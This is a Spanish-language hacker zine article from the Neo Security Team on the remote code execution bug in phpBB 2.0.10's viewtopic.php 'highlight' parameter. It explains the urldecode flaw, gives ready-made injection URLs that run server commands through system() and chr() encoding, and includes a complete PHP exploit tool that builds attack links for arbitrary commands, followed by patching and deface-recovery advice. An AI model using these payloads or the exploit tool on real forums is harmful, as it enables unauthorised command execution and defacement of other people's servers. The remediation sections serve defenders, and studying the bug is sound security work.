@@ -1,0 +1,204 @@
+
+
+                ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+                ³ Û²²±±°°Û  ==[N]eo [S]ecurity [T]eam Inc.==  #0x01 Û°°±±²²Û ³
+                ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+ ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+ °°°°°°°°°°°°±±±±±±±±±±±±²²²²²²²²²²²²²°°°°°°°°°°°°°±±±±±±±±±±±±²²²²²²²²²²²²²±±±±±±±±±±±±²²²²²²²²²²²²²²
+ ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+[+] 0x04 Bug en foros phpbb2 2.0.10 [+]
+--------------------------
+
+
+[+] Un paneo general de la vulnerabilidad.
+[+] Cómo explotar la vulnerabilidad.
+[+] Cómo parchear la vulnerabilidad.
+[+] Posibles formas de arreglar un deface y otras prevenciones.
+[+] Despidiéndome.
+
+---------------------------------------------------------------
+
+
+
+[-] Un paneo general de la vulnerabilidad [-]
+-------------------------------------
+
+	La última vulnerabilidad descubierta y publicada para estos foros se basa en un error de programación
+en el archivo viewtopic.php y afecta a la versión 2.0.10 y anteriores. Lo que nos permite esta vulnerabilidad
+es ejecutar todo tipo de co-mandos propios de php como por ejemplo system(), mysql_query() o cualquier otro.
+A continuación pongo el código "vulnerable" y paso a explicar en qué consiste el bug:
+
+//
+// Was a highlight request part of the URI?
+//
+$highlight_match = $highlight = '';
+if (isset($HTTP_GET_VARS['highlight']))
+{
+// Split words and phrases
+$words = explode(' ', trim(htmlspecialchars(urldecode($HTTP_GET_VARS['highlight']))));
+
+
+	Si tenemos un poco de sentido común, por la parte de código que puse, podemos darnos cuenta que la
+variable que nos permite la ejecución de código en php es highlight. Ahora bien, analicemos un poco este
+fragmento para saber en qué consiste el error.
+	La variable $words contiene el contenido de la variable highlight divido por espacios aunque medio
+alterado. En este caso, se usan distintas funciones para modificar el contenido de la variable. Primero se
+llama a la variable highlight pasada por el método GET, es decir, por la barra de direcciones. Y ahora viene
+el verdadero error: el uso de la función urldecode().Esta función toma la cadena pasada como argumento, en este
+caso la variable highlight y la desencripta, si es que esté codi-ficada con el método "url encode". La verdad
+sería una locura explicar TODO el bug completo así que sólo les digo que el error está en esa parte del código
+y en qué consiste el exploit.
+
+
+
+[-] Cómo explotar la vulnerabilidad [-]
+-------------------------------
+
+	Como base vamos a tomar una inyección que nos lista los archivos que hay en el directorio donde están
+ubicados los foros: http://foro.com/viewtopic.php?highlight=%2527%252esystem(chr(108)%252echr(115))%252e%2527
+
+	Para hacer cualquier inyección, la sintáxis de lo que pongamos tendrá que ser así:
+%2527%252eACÁ_EL_CÓDIGP)%252e%2527 En el caso que mostré recién, se ejecuta la función system, que ejecuta un
+comando en el servidor en el que está el foro, pe-ro con una particularidad. Para pasarle el comando que queremos
+ejecutar a la función system, no se lo podremos pasar "en limpio", por ejemplo: system("acá el comando"), sino
+que tendremos que usar el valor ascii de cada caracter que usemos. Aunque sería muy engorroso hacerlo "a mano",
+conviene explicar cómo se construye la inyección completa por más que más abajo haya puesto un script.
+	Bien, sabemos qué tenemos que tener de base y que no podemos pasar los argumentos de la función que
+queremos ejecutar en limpio, sino utilizando el código ascii. Lo que hay que hacer es usar la función chr()
+que devuelve el caracter represen-tado por el valor ascii pasado como parámetro, por ejemplo, chr(64) imprimirá
+"@". Además entre letra y letra, representada cada una por la función chr() (con el valor ascii del caracter como
+parámetro), tendremos que poner "%252e". En conclusión, ponemos la función a ejecutar, teniendo como argumento un
+fragmento de código que se construye con el uso de la función chr() (con el código ascii del caracter como
+parámetro) , y con un código que se repite. Aunque esto no se entiende mucho, es bastante fácil. Por ejemplo, si
+quiero ejecutar el comando "ps", la inyección será la siguiente:
+%2527%252esystem(chr(112)%252echr(115))%252e%2527
+El parámetro de la función main está divido en 3 partes: chr(112) que representa a "p", el %252e que es lo que
+estará entre caracter y caracter y chr(115) que representa a "s".
+
+	Ahora que les expliqué cómo explotar esta vulnerabilidad, les dejo un script que hice en php que no exije
+ningún módulo raro instalado en el servidor web y que facilita toda la engorrosa tarea de la construcción de la
+inyección:
+
+<?
+/*
+Author: Paisterist
+Date: 27/11/04
+[N]eo [S]ecurity [T]eam [NST] ©
+Description: This tool execute comands in the server of the forum selected. You need
+the path of the forum with the "/" at the final. Besides you need to specify the number
+of a topic that is in the forum, and, at the until, you put the commando in the input
+box. */
+?>
+<html>
+<head>
+<title>phpBB 2.0.10 Remote Exploit by Paisterist</title>
+</head>
+<body bgcolor=#000000 text=#FFFFFF link=#00ff00 vlink=#00FF00 alink=#00FF00>
+<center><h4>Remote execution exploit in forums phpbb 2.0.10</h4></center>
+<?
+if (isset($_POST[enviar])) {
+    $dir=$_POST[dir];
+    $cmd=$_POST[cmd];
+    $t=$_POST[t];
+    if ($dir!="" && $cmd!="" && $t!="") {
+        if (!ereg("http://", $dir)) $url="http://$dir";
+        else $url=$dir;
+        $large=strlen($cmd);
+        for ($i=0; $i<$large; $i++) {
+                            $char=ord($cmd[$i]);
+        $cadena.="chr($char)";
+        if (($large-$i!=1) or $i==0) {
+        $cadena.="%252e";
+        }}
+        $url.="viewtopic.php?t=$t&highlight=%2527%252esystem(".$cadena.")%252e%2527";
+        print "<a href=$url target=\"view\">Atacar!</a>";
+    }}
+?>
+<form method=POST action=phpbb_exploit.php>
+<table align=center>
+<tr>
+<td>Path of the forum: </td>
+<td><input type=text name=dir></td>
+<td>Comando a ejecutar: </td>
+<td><input type=Text name=cmd>
+<td>Topic: </td>
+<td><input name=t type=text>
+<td colspan=2><input type=submit name=enviar value=Explotar></td>
+</tr>
+</table>
+</form>
+</body>
+</html>
+
+
+
+[-] Cómo parchear el bug [-]
+--------------------
+
+	En primer lugar les recomiendo bajar la versión 2.0.11 de phpbb ya que es más que seguro que hay otros
+bugs además de ese. En caso de que no quieran hacer esto, pueden modificar el código que analizamos anteriormente
+abriendo el viewtopic.php y buscando el siguiente fragmento de código:
+
+//
+// Was a highlight request part of the URI?
+//
+$highlight_match = $highlight = '';
+if (isset($HTTP_GET_VARS['highlight']))
+{
+// Split words and phrases
+$words = explode(' ', trim(htmlspecialchars(urldecode($HTTP_GET_VARS['highlight']))));
+
+Y sacando el urldecode y sus respectivos paréntesis, de tal manera que les quede así:
+
+//
+// Was a highlight request part of the URI?
+//
+$highlight_match = $highlight = '';
+if (isset($HTTP_GET_VARS['highlight']))
+{
+// Split words and phrases
+$words = explode(' ', trim(htmlspecialchars($HTTP_GET_VARS['highlight'])));
+
+
+
+[-] Posibles formas de arreglar un deface  y otras prevenciones [-]
+----------------------------------------------------------
+
+	Si alguien explotó esta vulnerabilidad en nuestro foro  y borró el index o solamente defaceo, tenemos
+distintas for-mas de arreglar el problema.
+	En primer lugar, si el atacante no cambió los datos de la base de datos, podemos entrar al administrador
+de la base de datos, generalmente, PhpMyAdmin, y desde ahí ir a la tabla phpbb_users. Una vez que estamos ahí,
+cambiamos el hash md5 que hay como password y ponemos el md5 de otro pass nuevo, para usar cuando queramos
+loguearnos.
+	Si queremos que en nuestro servidor no se puedan ejecutar comandos, para que, en caso de que salga un
+nuevo bug que permite la ejecución remota de comandos en foros phpbb2, el atacante no pueda hacer absolutamente
+nada, tenemos que cambiar la propiedad safe_mode del archivo de configuración php.ini. Buscamos la cadena
+safe_mode y ponemos el valor en ON. De esta manera, estaremos prevenidos con toda ejecución de comandos que se
+quiera hacer a partir de un archivo .php. Para prevenirnos de sql inyections, lo más conveniente es cambiar el
+prefijo de la tabla, es decir, cambiar el phpbb_por otro cualquiera que queramos para que, cuando el atacante haga
+una consulta de este estilo: select * from phpbb_users where userid=1 (para obtener los administradores), no pueda
+hacer nada ya que esa tabla no existirá. 
+	Ahora bien, ¿cómo cambiamos el prefijo de las tablas?. Vamos a nuestro PhpMyAdmin, nos dirigimos hacia la
+base de da-tos del foro y una vez ahí, tabla por tabla, vamos cambiando el nombre de cada uno, de manera tal que
+en vez de que esté el phpbb_ delante de cada tabla, esté otra cadena que nosotros queramos como prefijo. Cuando
+terminamos de hacer esto con las 29 tablas vamos al archivo config.php del foro, lo abrimos y cambiamos el valor
+de la variable table_prefix por el prefijo que usamos.
+	
+
+
+Despidiéndome
+-------------	
+
+	Acá termina mi humilde y corto artículo. Espero que les sirva de algo a aquellos que tengan estos foros
+(dicho sea de paso, muy mal programados). 
+
+Paisterist - [N]eo [S]ecurity [T]eam - [NST]
+
+ ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+ °°°°°°°°°°°°±±±±±±±±±±±±²²²²²²²²²²²²²°°°°°°°°°°°°°±±±±±±±±±±±±²²²²²²²²²²²²²±±±±±±±±±±±±²²²²²²²²²²²²²²
+ ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+      
+ 
+|---------------------==========================[ EOF ]==========================---------------------|
